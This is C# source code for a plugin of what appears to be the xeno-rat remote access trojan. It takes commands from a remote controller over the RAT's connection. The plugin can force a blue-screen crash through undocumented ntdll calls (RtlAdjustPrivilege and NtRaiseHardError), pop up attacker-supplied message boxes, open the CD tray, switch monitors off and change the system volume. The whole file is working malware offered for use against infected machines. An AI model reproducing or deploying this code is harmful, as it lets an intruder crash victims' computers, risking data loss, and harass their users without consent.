using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Media;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using xeno_rat_client;


namespace Plugin
{
    [ComImport]
    [Guid("5CDF2C82-841E-4546-9722-0CF74078229A"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
    interface IAudioEndpointVolume
    {
        int f(); int g(); int h(); int i();
        int SetMasterVolumeLevelScalar(float fLevel, System.Guid pguidEventContext);
        int j();
        int GetMasterVolumeLevelScalar(out float pfLevel);
        int k(); int l(); int m(); int n();
        int SetMute([MarshalAs(UnmanagedType.Bool)] bool bMute, System.Guid pguidEventContext);
        int GetMute(out bool pbMute);
    }

    [ComImport]
    [Guid("D666063F-1587-4E43-81F1-B948E807363F")]
    [InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
    interface IMMDevice
    {
        [PreserveSig]
        int Activate(ref Guid iid, int dwClsCtx, IntPtr pActivationParams, [Out, MarshalAs(UnmanagedType.IUnknown)] out object ppInterface);
    }

    [ComImport]
    [Guid("A95664D2-9614-4F35-A746-DE8DB63617E6"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
    interface IMMDeviceEnumerator
    {
        int f();
        [PreserveSig]
        int GetDefaultAudioEndpoint(int dataFlow, int role, out IMMDevice ppDevice);
    }

    [ComImport]
    [Guid("BCDE0395-E52F-467C-8E3D-C4579291692E")]
    class MMDeviceEnumeratorComObject
    {
    }
    public class Main
    {
        [DllImport("ntdll.dll")]
        private static extern uint RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege, bool IsThreadPrivilege, out bool PreviousValue);
        [DllImport("ntdll.dll")]
        private static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response);
        [DllImport("winmm.dll")]
        private static extern uint mciSendString(
            string lpstrCommand,
            StringBuilder lpstrReturnString,
            int uReturnLength,
            IntPtr hWndCallback
        );

        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        private static extern IntPtr SendMessage(IntPtr hWnd, uint Msg, int wParam, int lParam);

        [DllImport("winmm.dll")]
        private static extern int waveOutSetVolume(IntPtr hwo, uint dwVolume);


        private const int HWND_BROADCAST = 0xffff;
        private const int WM_SYSCOMMAND = 0x0112;
        private const int SC_MONITORPOWER = 0xF170;
        private const int MONITOR_OFF = 2;
        private const int MONITOR_ON = -1;

        public async Task Run(Node node)
        {
            await node.SendAsync(new byte[] { 3 });//indicate that it has connected
            int opcode = (await node.ReceiveAsync())[0];
            if (opcode == 0)
            {
                BlueScreen();
            }
            else if (opcode == 1)
            {
                await ShowMessageBox(node);
            }
            else if (opcode == 2) 
            {
                await StartLoop(node);
                return;
            }

        }
        public void BlueScreen()
        {
            RtlAdjustPrivilege(19, true, false, out bool tmp1);
            NtRaiseHardError(0xC0140002, 0, 0, IntPtr.Zero, 6, out uint tmp2);
        }
        public async Task ShowMessageBox(Node node)
        {
            string text = Encoding.UTF8.GetString(await node.ReceiveAsync());
            await Task.Run(()=>MessageBox.Show(text, "Message",MessageBoxButtons.OK, MessageBoxIcon.None, MessageBoxDefaultButton.Button1, (MessageBoxOptions)0x40000));
        }
        public void OpenCDtray() 
        {
            mciSendString("set cdaudio door open", null, 0, IntPtr.Zero);
        }
        public void CloseCdtray() 
        {
            mciSendString("set cdaudio door close", null, 0, IntPtr.Zero);
        }
        public void MonitorOff()
        {
            SendMessage((IntPtr)HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, MONITOR_OFF);
        }
        public void MonitorOn()
        {
            SendMessage((IntPtr)HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, MONITOR_ON);
        }
        public void SetVolume(int vol) 
        {
            const int eRender = 0;
            const int eMultimedia = 1;
            Guid IID_IAudioEndpointVolume = typeof(IAudioEndpointVolume).GUID;
            var enumerator = new MMDeviceEnumeratorComObject() as IMMDeviceEnumerator;
            IMMDevice dev = null;
            Marshal.ThrowExceptionForHR(enumerator.GetDefaultAudioEndpoint(eRender, eMultimedia, out dev));
            object epv_obj = null;
            var epvid = new Guid("5CDF2C82-841E-4546-9722-0CF74078229A");
            Marshal.ThrowExceptionForHR(dev.Activate(ref epvid, 0, IntPtr.Zero, out epv_obj));
            var epv = epv_obj as IAudioEndpointVolume;
            Guid guid = Guid.Empty;
            epv.SetMasterVolumeLevelScalar((float)vol /100f, guid);
            bool isMuted;
            epv.GetMute(out isMuted);
            if (isMuted)
            {
                epv.SetMute(false, guid);
            }
        }
        public async Task StartLoop(Node node) 
        {
            while (node.Connected()) 
            {
                int opcode = (await node.ReceiveAsync())[0];
                if (opcode == 1)
                {
                    OpenCDtray();
                }
                else if (opcode == 2)
                {
                    CloseCdtray();
                }
                else if (opcode == 3)
                {
                    MonitorOff();
                }
                else if (opcode == 4)
                {
                    MonitorOn();
                }
                else if (opcode == 5) 
                {
                    int volume = (await node.ReceiveAsync())[0];
                    SetVolume(volume);
                }
            }
        }
    }
}
